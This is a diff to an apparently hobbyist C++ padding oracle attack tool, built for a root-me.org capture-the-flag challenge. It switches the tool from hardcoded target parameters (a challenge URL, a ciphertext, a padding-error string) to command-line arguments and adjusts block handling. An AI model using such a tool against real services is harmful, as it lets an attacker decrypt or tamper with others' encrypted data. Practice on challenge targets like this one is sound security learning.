@@ -23,7 +23,13 @@ void worker(
     std::string& msg
 ) {
     CURL* curl = CurlInit();
-    unsigned int p; 
+    unsigned int p;
+
+    if (blocks.size() < (k+1)) {
+        Log::error("Not enough blocks to slice in worker " + std::to_string(k));
+        CurlCleanup(curl);
+        exit(1);
+    }
     std::vector<std::string> slice(blocks.begin(), blocks.begin() + (k+2));
 
     CypherData cd = Fuzz(curl, slice, k);
@@ -45,24 +51,25 @@ void worker(
 int main(int argc, char* argv[]) {
     Log::print(Constants::BAN);
 
-    // Args args = getArgs(argc, argv);
+    Args args = getArgs(argc, argv);
 
-    // Log::print("URL: "+args.url);
-    // Log::print("Method: " + args.method);
-    // if (!args.data.empty()) {
-    //     Log::print("Data: " + args.data);
-    // }
-    // Log::print("Cypher: " + args.cypher);
-    // Log::print("Block size: " + args.blockSize);
-    // Log::print("Padding error: " + args.paddingError);
+    //Args args;
+    // args.blockSize = 16;
+    // args.cypher = "59873749DC0D3A4ACC7F19D711853685EFCDBFECDF85D6B3AF6171F793CC20B4";
+    // args.data = "c=";
+    // args.method = "GET";
+    // args.paddingError = "Padding Error";
+    // args.url = "http://challenge01.root-me.org/realiste/ch12/index.aspx";
 
-    Args args;
-    args.blockSize = 16;
-    args.cypher = "59873749DC0D3A4ACC7F19D711853685EFCDBFECDF85D6B3AF6171F793CC20B4";
-    args.data = "c=";
-    args.method = "GET";
-    args.paddingError = "Padding Error";
-    args.url = "http://challenge01.root-me.org/realiste/ch12/index.aspx";
+    Log::print("URL: "+args.url);
+    Log::print("Method: " + args.method);
+    if (!args.data.empty()) {
+        Log::print("Data: " + args.data);
+    }
+    Log::print("Cypher: " + args.cypher);
+    Log::print("Block size: " + std::to_string(args.blockSize));
+    Log::print("Padding error: " + args.paddingError);
+    std::cout << std::endl;
 
     // init target parameters
     Target::initialize(
@@ -74,11 +81,11 @@ int main(int argc, char* argv[]) {
     );
 
     std::vector<std::string> blocks = GetBlocks(args.cypher);
-    unsigned int nBlocks = blocks.size();
+    unsigned int nBlocks = blocks.size()-1; // -1 because we added a block of 0x00s
     
     Log::print("Blocks:");
     unsigned int k;
-    for (k=0; k<nBlocks;k++) {
+    for (k=1; k<nBlocks+1;k++) {
         Log::print(std::to_string(k) + ": " + blocks[k]);
     }
     Log::print("\nPress any key to start the attack...\n");
